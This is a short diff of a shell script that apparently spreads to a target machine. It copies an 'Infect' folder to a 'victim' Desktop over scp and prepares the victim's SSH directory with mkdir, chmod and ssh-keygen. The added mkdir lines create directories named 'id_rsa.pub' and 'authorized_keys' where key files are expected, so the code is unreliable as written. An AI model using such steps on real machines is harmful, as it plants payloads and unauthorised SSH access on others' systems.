@@ -22,7 +22,9 @@ scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/
 
 # publickey
 SSH_PATH="/home/victim/.ssh"
-#mkdir -p /home/victim/.ssh
+
+mkdir "$SSH_PATH"/id_rsa.pub
+mkdir "$SSH_PATH"/authorized_keys
 
 chmod 700 "$SSH_PATH"
 ssh-keygen
